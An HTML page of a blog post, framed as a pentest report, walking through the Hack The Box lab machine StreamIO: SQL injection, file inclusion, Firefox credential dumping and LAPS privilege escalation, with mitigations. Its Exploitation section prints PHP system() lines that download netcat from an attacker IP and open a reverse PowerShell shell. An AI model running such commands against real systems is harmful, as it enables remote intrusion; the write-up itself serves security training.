@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>StreamIO // Cyber security blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="blackcaesar0" />
+    <meta name="description" content="" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="/css/main.min.377f2d66405c1bfcb6acd9f9443e360c1e22a15fd0d237536293146ae120afa7.css" />
+    
+    <link rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" />
+    
+    <link rel="stylesheet" href="/css/syntax.min.75f72a772b07d954f0e2ba8e3f133d10d16954e7e73ef8bfc57aafe00f511e44.css" />
+    
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="StreamIO"/>
+<meta name="twitter:description" content="Penetration Testing Report: StreamIO.htb Prepared by: blackcaesar0/SYN
+Executive Summary This test covers the security of streamio.htb, targeting SQL injection, file inclusion vulnerabilities, and privilege escalation.
+Target: streamio.htb, watch.streamio.htb IP: 10.129.141.95 OS: Windows Server Methodology: Enumeration, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting Key findings: SQL injection in search.php, RFI leading to command execution, privilege escalation via LAPS misconfiguration, and Firefox profile credential dumping.
+Enumeration Used nmap and wfuzz for directory and vhost enumeration."/>
+
+    <meta property="og:title" content="StreamIO" />
+<meta property="og:description" content="Penetration Testing Report: StreamIO.htb Prepared by: blackcaesar0/SYN
+Executive Summary This test covers the security of streamio.htb, targeting SQL injection, file inclusion vulnerabilities, and privilege escalation.
+Target: streamio.htb, watch.streamio.htb IP: 10.129.141.95 OS: Windows Server Methodology: Enumeration, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting Key findings: SQL injection in search.php, RFI leading to command execution, privilege escalation via LAPS misconfiguration, and Firefox profile credential dumping.
+Enumeration Used nmap and wfuzz for directory and vhost enumeration." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blackcaesar0.com/hackthebox/streamio/" /><meta property="article:section" content="hackthebox" />
+<meta property="article:published_time" content="2025-02-21T06:43:05+01:00" />
+<meta property="article:modified_time" content="2025-02-21T06:43:05+01:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/dragon.png" alt="blackcaesar0" /></a>
+      <span class="app-header-title">blackcaesar0</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/hackthebox/">Hackthebox</a>
+      </nav>
+      <p>Offensive security writeups covering web, AD, Windows, Linux, and full network compromise.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-linkedin" viewBox="0 0 24 24" fill="currentColor"><title>LinkedIn</title><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+        
+          <a href="https://app.hackthebox.com/profile/1887629" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-hackthebox" viewBox="0 0 24 24" fill="currentColor"><title>Hack The Box</title><path d="m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z"/></svg>
+          </a>
+        
+          <a href="https://tryhackme.com/p/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-tryhackme" viewBox="0 0 24 24" fill="currentColor"><title>TryHackMe</title><path d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"/></svg>
+          </a>
+        
+          <a href="https://pentesterlab.com/profile/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-pentesterlab" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>PentesterLab</title><polygon points="12,2 21.5,8.9 17.9,20.1 6.1,20.1 2.5,8.9"/><path d="M10 8.5 L10 15.5 M10 8.5 Q15 8.5 15 11 Q15 13.5 10 13.5"/></svg>
+          </a>
+        
+          <a href="https://bugcrowd.com/h/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-bugcrowd" viewBox="0 0 24 24" fill="currentColor"><title>Bugcrowd</title><path d="M24 12L18 1.387H6L0 12l6 10.613h12zm-5.782 1.658c-.003.825-.122 1.569-.354 2.231a5.05 5.05 0 0 1-.99 1.708 4.316 4.316 0 0 1-1.503 1.093 4.69 4.69 0 0 1-1.896.385 4.158 4.158 0 0 1-1.145-.152 3.754 3.754 0 0 1-.868-.36 3.792 3.792 0 0 1-.601-.435 3.023 3.023 0 0 1-.466-.514h-.04l.02.193c.011.166.018.331.02.497v.528H7.961V7.062c0-.151-.04-.263-.114-.337-.077-.074-.19-.109-.33-.109h-.811V4.425h2.452c.473-.003.824.108 1.048.331.222.223.333.576.33 1.049v3.003c-.003.258-.01.467-.02.626l-.02.247h.04a2.898 2.898 0 0 1 .463-.507c.156-.143.354-.284.6-.426.245-.142.538-.261.876-.36.38-.1.77-.15 1.162-.148.702.003 1.334.135 1.894.395a4.118 4.118 0 0 1 1.446 1.11c.4.48.707 1.052.92 1.715.212.658.317 1.392.32 2.198m-2.803 1.406c.138-.399.206-.852.209-1.366-.003-.659-.112-1.231-.328-1.718-.216-.484-.517-.859-.902-1.125a2.347 2.347 0 0 0-1.344-.404 2.57 2.57 0 0 0-.969.186 2.372 2.372 0 0 0-.83.589 2.839 2.839 0 0 0-.579 1.015c-.141.413-.212.906-.216 1.477 0 .397.053.792.159 1.174.101.366.265.712.483 1.02.211.3.486.548.805.722.32.176.698.267 1.127.27.343.002.683-.07.997-.213a2.43 2.43 0 0 0 .824-.623c.24-.273.428-.607.564-1.004Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">StreamIO</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Feb 21, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          2 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="penetration-testing-report-streamiohtb">Penetration Testing Report: StreamIO.htb</h1>
+<p>Prepared by: blackcaesar0/SYN</p>
+<hr>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>This test covers the security of <code>streamio.htb</code>, targeting SQL injection, file inclusion vulnerabilities, and privilege escalation.</p>
+<ul>
+<li>Target: <code>streamio.htb</code>, <code>watch.streamio.htb</code></li>
+<li>IP: 10.129.141.95</li>
+<li>OS: Windows Server</li>
+<li>Methodology: Enumeration, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting</li>
+</ul>
+<p>Key findings: SQL injection in <code>search.php</code>, RFI leading to command execution, privilege escalation via LAPS misconfiguration, and Firefox profile credential dumping.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<p>Used <code>nmap</code> and <code>wfuzz</code> for directory and vhost enumeration. Discovered subdomains <code>watch.streamio.htb</code> and <code>streamio.htb</code>, enumerated directories and parameters.</p>
+<p><img src="/static/streamio/dir_fuzzing.png" alt="Screenshot">
+<img src="/static/streamio/admin_dir_fuzzing.png" alt="Screenshot">
+<img src="/static/streamio/parameter_fuzzing.png" alt="Screenshot"></p>
+<hr>
+<h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
+<p>Tools: Burp Suite, <code>wfuzz</code> for parameter fuzzing, manual code review.</p>
+<ul>
+<li>SQL injection in <code>search.php</code> enabled credential dumping.</li>
+<li>LFI via the <code>debug</code> parameter allowed source code access.</li>
+<li>RFI enabled arbitrary file execution.</li>
+</ul>
+<p><img src="/static/streamio/sql_injection.png" alt="Screenshot">
+<img src="/static/streamio/sql_injection_password_dump.png" alt="Screenshot">
+<img src="/static/streamio/password_hash_cracking.png" alt="Screenshot">
+<img src="/static/streamio/master_php_source_code.png" alt="Screenshot"></p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<p>SQL injection allowed retrieval of database credentials. The RFI vulnerability led to reverse shell execution:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;powershell -c wget 10.10.14.161/nc64.exe -outfile C:</span><span class="se">\\</span><span class="s2">programdata</span><span class="se">\\</span><span class="s2">nc64.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">programdata</span><span class="se">\\</span><span class="s2">nc64.exe -e powershell 10.10.14.161 4443&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Initial access gained as <code>yoshihide</code>.</p>
+<p><img src="/static/streamio/command_execution.png" alt="Screenshot">
+<img src="/static/streamio/FI_file_download.png" alt="Screenshot">
+<img src="/static/streamio/rev_shell.png" alt="Screenshot"></p>
+<hr>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<p>Tools: Evil-WinRM, BloodHound, <code>firefox_decrypt</code>.</p>
+<ul>
+<li>Extracted database credentials from <code>inetpub/streamio.htb/admin/index.php</code>.</li>
+<li>Dumped additional credentials from <code>backup_streamio</code>.</li>
+<li>Found Firefox profiles and extracted stored credentials using <code>firefox_decrypt</code>.</li>
+<li>BloodHound showed <code>jdgodd</code> had <code>WriteOwner</code> on the <code>core staff</code> group, which had access to LAPS passwords.</li>
+<li>Privilege escalation via LAPS misconfiguration to administrative access.</li>
+</ul>
+<p><img src="/static/streamio/source_code_of_master_php.png" alt="Screenshot">
+<img src="/static/streamio/database_backup_password_dump.png" alt="Screenshot">
+<img src="/static/streamio/database_backup_password_hash_cracking.png" alt="Screenshot">
+<img src="/static/streamio/user_access.png" alt="Screenshot">
+<img src="/static/streamio/firefox_login_passwords.png" alt="Screenshot">
+<img src="/static/streamio/firefox_login_creds_dump.png" alt="Screenshot">
+<img src="/static/streamio/bloodhound_data_collection.png" alt="Screenshot">
+<img src="/static/streamio/graph_enum.png" alt="Screenshot">
+<img src="/static/streamio/writeowner.png" alt="Screenshot">
+<img src="/static/streamio/adding_jdgodd_to_core_staff.png" alt="Screenshot">
+<img src="/static/streamio/reading_laps.png" alt="Screenshot"></p>
+<hr>
+<h2 id="findings">Findings</h2>
+<h3 id="sql-injection-in-searchphp">SQL Injection in search.php</h3>
+<ul>
+<li>Risk: High</li>
+<li>Impact: unauthorized database access and credential dumping.</li>
+<li>Mitigation: parameterized queries, sanitize input.</li>
+</ul>
+<h3 id="lfi-via-debug-parameter">LFI via debug Parameter</h3>
+<ul>
+<li>Risk: High</li>
+<li>Impact: access to sensitive source code.</li>
+<li>Mitigation: restrict user input, use allowlisted file paths.</li>
+</ul>
+<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
+<ul>
+<li>Risk: Critical</li>
+<li>Impact: execution of arbitrary remote files.</li>
+<li>Mitigation: disable remote file inclusion, implement input validation.</li>
+</ul>
+<h3 id="reverse-shell-via-rfi">Reverse Shell via RFI</h3>
+<ul>
+<li>Risk: Critical</li>
+<li>Impact: full system compromise.</li>
+<li>Mitigation: restrict file inclusions, apply principle of least privilege.</li>
+</ul>
+<h3 id="firefox-profile-credential-dumping">Firefox Profile Credential Dumping</h3>
+<ul>
+<li>Risk: Medium</li>
+<li>Impact: access to stored passwords.</li>
+<li>Mitigation: use encrypted password storage, enforce MFA.</li>
+</ul>
+<h3 id="privilege-escalation-via-laps-misconfiguration">Privilege Escalation via LAPS Misconfiguration</h3>
+<ul>
+<li>Risk: Critical</li>
+<li>Impact: administrator credential retrieval.</li>
+<li>Mitigation: restrict LAPS read permissions, monitor privilege assignments.</li>
+</ul>
+<hr>
+<h2 id="recommendations">Recommendations</h2>
+<ul>
+<li>Implement parameterized queries and sanitize user inputs.</li>
+<li>Restrict remote and local file inclusions, use allowlists.</li>
+<li>Regularly audit and restrict access rights.</li>
+<li>Ensure only authorized accounts can read LAPS credentials.</li>
+<li>Use secure password managers instead of browser storage.</li>
+<li>Enable centralized logging and monitor authentication logs for unusual activity.</li>
+<li>Update web application components and conduct regular security assessments.</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  <script>
+    document.querySelectorAll('.post-content .highlight').forEach(block => {
+      const code = block.querySelector('code[data-lang]')
+      const lang = code ? code.getAttribute('data-lang') : ''
+
+      const header = document.createElement('div')
+      header.className = 'code-header'
+
+      const dots = document.createElement('span')
+      dots.className = 'code-dots'
+      dots.innerHTML = '<span></span><span></span><span></span>'
+      header.appendChild(dots)
+
+      if (lang && lang !== 'fallback') {
+        const label = document.createElement('span')
+        label.className = 'code-lang'
+        label.textContent = lang
+        header.appendChild(label)
+      }
+
+      const btn = document.createElement('button')
+      btn.className = 'copy-btn'
+      btn.textContent = 'copy'
+      btn.addEventListener('click', () => {
+        const text = block.querySelector('code').innerText
+        navigator.clipboard.writeText(text).then(() => {
+          btn.textContent = 'copied'
+          setTimeout(() => { btn.textContent = 'copy' }, 2000)
+        })
+      })
+      header.appendChild(btn)
+      block.insertBefore(header, block.firstChild)
+    })
+  </script>
+  </body>
+</html>
